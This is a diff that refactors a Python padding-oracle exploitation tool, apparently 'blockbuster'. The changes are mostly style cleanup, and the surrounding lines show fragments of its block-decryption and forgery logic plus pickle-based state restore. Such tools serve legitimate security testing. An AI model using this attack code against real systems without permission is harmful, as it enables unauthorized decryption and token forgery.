@@ -2,22 +2,23 @@
 # A python padding oracle vulnerability exploitation tool
 # By Paul Mueller (@paulmmueller)
 
-import socket
-import httpx
-import sys
-import urllib.parse
-import binascii
 import argparse
-import os.path
-from os import path
+import asyncio
+import base64
+import binascii
 import configparser
 import json
-import validators
-import pickle
-import time
-import base64
 import os
-import asyncio
+import os.path
+import pickle
+import socket
+import sys
+import time
+import urllib.parse
+from os import path
+
+import httpx
+import validators
 
 # httpx does not emit SSL warnings by default when verify=False
 
@@ -34,16 +35,16 @@ def encode_multipart(fields):
 
     body = (
         "".join(
-            "--%s\r\n"
-            'Content-Disposition: form-data; name="%s"\r\n'
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="{field}"\r\n'
             "\r\n"
-            "%s\r\n" % (boundary, field, value)
+            f"{value}\r\n"
             for field, value in fields.items()
         )
-        + "--%s--\r\n" % boundary
+        + f"--{boundary}--\r\n"
     )
 
-    content_type = "multipart/form-data; boundary=%s" % boundary
+    content_type = f"multipart/form-data; boundary={boundary}"
 
     return body, content_type
 
@@ -55,12 +56,15 @@ def split_by_n(seq, n):
         seq = seq[n:]
 
 
+class BlockFailedError(Exception):
+    pass
+
+
 # append message to log files
 def writeToLog(message):
     ts = str(time.time())
-    f = open("blockbuster.log", "a")
-    f.write(f"{ts}:{message}\n")
-    f.close()
+    with open("blockbuster.log", "a") as f:
+        f.write(f"{ts}:{message}\n")
 
 
 # / and + b64 characters are problematic if they are not URL encoded
@@ -93,10 +97,14 @@ def saveState(job):
     byte_suffix = (
         f"-BYTE_{bytes_done}" if bytes_done > 0 and currentBlockStr != "FINAL" else ""
     )
-    outputFileName = f"blockbuster-state-{job.name}-BLOCK_{currentBlockStr}{byte_suffix}-{str(int(ts))}.pkl"
-    pickleOut = open(outputFileName, "wb")
-    pickle.dump(job, pickleOut)
-    pickleOut.close()
+    outputFileName = f"blockbuster-state-{job.name}-BLOCK_{currentBlockStr}{byte_suffix}-{int(ts)}.pkl"
+    with open(outputFileName, "wb") as pickleOut:
+        pickle.dump(job, pickleOut)
+
+
+def loadState(fileName):
+    with open(fileName, "rb") as pickleFile:
+        return pickle.load(pickleFile)
 
 
 # add padding to the end of the string
@@ -113,7 +121,7 @@ def paddify(string, blocksize):
             # if we fall right on a block boundary, we need a full block of padding
             if padding_length == 0:
                 padding_length = blocksize
-            for i in range(0, padding_length):
+            for i in range(padding_length):
                 temp_group = temp_group + chr(padding_length)
             groups_storage.append(temp_group)
     paddedstring = "".join(groups_storage)
@@ -157,10 +165,10 @@ class Job:
         print("[*]Initializing job....")
         self.name = name
         print(f"\nJob name: {self.name}")
-        print(f"[+]Blocksize: {str(blocksize)}")
+        print(f"[+]Blocksize: {blocksize}")
         self.blocksize = blocksize
         self.mode = mode
-        print(f"\n[+]Mode: {str(mode)}")
+        print(f"\n[+]Mode: {mode}")
         self.debug = debug
         if self.debug:
             print("[+]Debug Mode ON\n")
@@ -827,7 +835,7 @@ class Job:
         print("##################################")
         try:
             print("".join(self.solvedBlocks.values()))
-        except Exception:
+        except TypeError:
             print(b"".join(self.solvedBlocks.values()))
         print("##################################")
 
@@ -856,7 +864,7 @@ class Job:
             "\n[!]ERROR! No characters produced valid padding! This must mean there was previously an irrecoverable error!"
         )
         print("*************************************************\n")
-        raise Exception(
+        raise BlockFailedError(
             "Block failed to decrypt/encrypt, likely a random network error."
         )
         # sys.exit(2)
@@ -931,7 +939,7 @@ class Job:
                         (self.blocks[self.currentBlock][currentbyte]) ^ currenti
                     )
                     print(
-                        f"[+]crypto value of this char in the next (previous) block is: {str(currentcrypto)}\n"
+                        f"[+]crypto value of this char in the next (previous) block is: {currentcrypto}\n"
                     )
                     solved_crypto[currentbyte] = currentcrypto
                     padding_num += 1
@@ -964,7 +972,7 @@ class Job:
 
             currentcrypto = (self.blocks[self.currentBlock][currentbyte]) ^ currenti
             print(
-                f"[+]crypto value of this char in the next (previous) block is: {str(currentcrypto)}\n"
+                f"[+]crypto value of this char in the next (previous) block is: {currentcrypto}\n"
             )
             solved_crypto[currentbyte] = currentcrypto
 
@@ -1034,7 +1042,7 @@ class Job:
                     print(f"[+] Verified! Skipping byte {currentbyte}")
                     solved_intermediates[currentbyte] = currenti
                     currentreal = (previousBlock[currentbyte]) ^ currenti
-                    print(f"[+]real value of last char is: {str(currentreal)}\n")
+                    print(f"[+]real value of last char is: {currentreal}\n")
                     solved_reals[currentbyte] = currentreal
                     padding_num += 1
                     currentbyte -= 1
@@ -1079,7 +1087,7 @@ class Job:
 
         try:
             blockresult.decode()
-        except Exception:
+        except UnicodeDecodeError:
             blockresult.decode("latin1")
             print("[*] Block contains non-UTF-8 bytes, using latin1 decoding")
         writeToLog(f"[!]BLOCK SOLVED: {blockresult}")
@@ -1092,7 +1100,7 @@ class Job:
             try:
                 result = await self.decryptBlock()
 
-            except Exception as e:
+            except Exception as e:  # noqa: BLE001 - any failure (network, padding) aborts just this block
                 writeToLog(
                     f"[!] decryption of block {self.currentBlock} failed. Error message: {e}"
                 )
@@ -1103,7 +1111,7 @@ class Job:
         if self.mode == "encrypt":
             try:
                 result = await self.encryptBlock()
-            except Exception as e:
+            except Exception as e:  # noqa: BLE001 - any failure (network, padding) aborts just this block
                 writeToLog(
                     f"[!] encryption of block {self.currentBlock} failed. Error message: {e}"
                 )
@@ -1176,8 +1184,8 @@ class Job:
 
         # Get the block count and save it to the instance
         print(actualBlocks)
-        print(int(len(actualBlocks)))
-        self.blockCount = int((len(actualBlocks) / self.blocksize))
+        print(len(actualBlocks))
+        self.blockCount = int(len(actualBlocks) / self.blocksize)
 
         # if the mode is 'firstblock' we need to remove the first block and assign it as the IV
         if self.ivMode == "firstblock":
@@ -1202,7 +1210,7 @@ class Job:
             print("*************************************************\n")
 
         # iterate through the block array and separate the blocks
-        for x in range(0, self.blockCount):
+        for x in range(self.blockCount):
             # take the next block off and add it to self.blocks
             self.blocks.append(actualBlocks[0 : self.blocksize])
 
@@ -1277,10 +1285,10 @@ class Job:
         actualBlocks = self.bytemap[:]
 
         # Get the block count and save it to the instance
-        self.blockCount = int((len(self.bytemap) / self.blocksize))
+        self.blockCount = int(len(self.bytemap) / self.blocksize)
 
         # iterate through the block array and separate the blocks
-        for x in range(0, self.blockCount):
+        for x in range(self.blockCount):
             # take the next block off and add it to self.blocks
             self.blocks.append(actualBlocks[0 : self.blocksize])
 
@@ -1354,9 +1362,7 @@ async def async_main():
             f"\n[!]RESTORE MODE INTIATED. Attempting to restart job from file {args.restore}"
         )
 
-        pickleFile = open(args.restore, "rb")
-        job = pickle.load(pickleFile)
-        pickleFile.close()
+        job = loadState(args.restore)
         # Recreate the httpx client since it can't be pickled
         job.initialize_client()
         if not hasattr(job, "preseeded_intermediates"):
@@ -1433,31 +1439,26 @@ async def async_main():
             )
 
         # Validate POST format
-        if httpMethod == "POST":
-            if postFormat == "form-urlencoded":
-                pass
-
-            elif postFormat == "multipart":
-                pass
-
-            elif postFormat == "json":
-                pass
-            else:
-                handleError(
-                    "[x]CONFIG ERROR: When httpMethod is POST postFormat must be 'form-urlencoded', 'multipart', or 'json'"
-                )
+        if httpMethod == "POST" and postFormat not in (
+            "form-urlencoded",
+            "multipart",
+            "json",
+        ):
+            handleError(
+                "[x]CONFIG ERROR: When httpMethod is POST postFormat must be 'form-urlencoded', 'multipart', or 'json'"
+            )
         # validate proxy IP
         if httpProxyIp:
             try:
                 socket.inet_aton(httpProxyIp)
-            except socket.error:
+            except OSError:
                 handleError("[x]CONFIG ERROR: proxy ip is not a valid IP address.")
 
         # validate proxy port
         if httpProxyPort:
             try:
                 httpProxyPort = int(httpProxyPort)
-            except Exception:
+            except ValueError:
                 handleError("[x]CONFIG ERROR: proxy port is not valid INT")
 
             if not (httpProxyPort <= 65535):
@@ -1466,7 +1467,7 @@ async def async_main():
         # validate block size
         try:
             blocksize = int(blocksize)
-        except Exception:
+        except ValueError:
             handleError("[x]CONFIG ERROR: blocksize must be INT.")
 
         if not validators.url(URL):
@@ -1499,11 +1500,10 @@ async def async_main():
 
         # anchorBlock mode requires anchorCiphertext
         anchorCiphertext = config["default"].get("anchorCiphertext", "")
-        if ivMode == "anchorBlock":
-            if not anchorCiphertext:
-                handleError(
-                    "[x]CONFIG ERROR: anchorCiphertext is required when ivMode is anchorBlock"
-                )
+        if ivMode == "anchorBlock" and not anchorCiphertext:
+            handleError(
+                "[x]CONFIG ERROR: anchorCiphertext is required when ivMode is anchorBlock"
+            )
 
         # Initialize Job object
         job = Job(
@@ -1596,7 +1596,7 @@ async def async_main():
 
     # if we just completed an encrypt operation, we need to reverse the order, join the pieces, and base64
     if job.mode == "encrypt":
-        for xxx in range(0, len(job.solvedBlocks.values())):
+        for xxx in range(len(job.solvedBlocks.values())):
             # combine all of the blocks into one decimal list
             joinedCrypto = b"".join(reversed(list(job.solvedBlocks.values())))
 
@@ -1633,7 +1633,7 @@ async def async_main():
             stripped = combined
         try:
             plaintext = stripped.decode(job.plaintextEncoding)
-        except Exception:
+        except (UnicodeDecodeError, LookupError):
             plaintext = stripped.decode("latin1")
         print(f"\n{'=' * 50}")
         print(f"[+] Decrypted plaintext: {plaintext}")
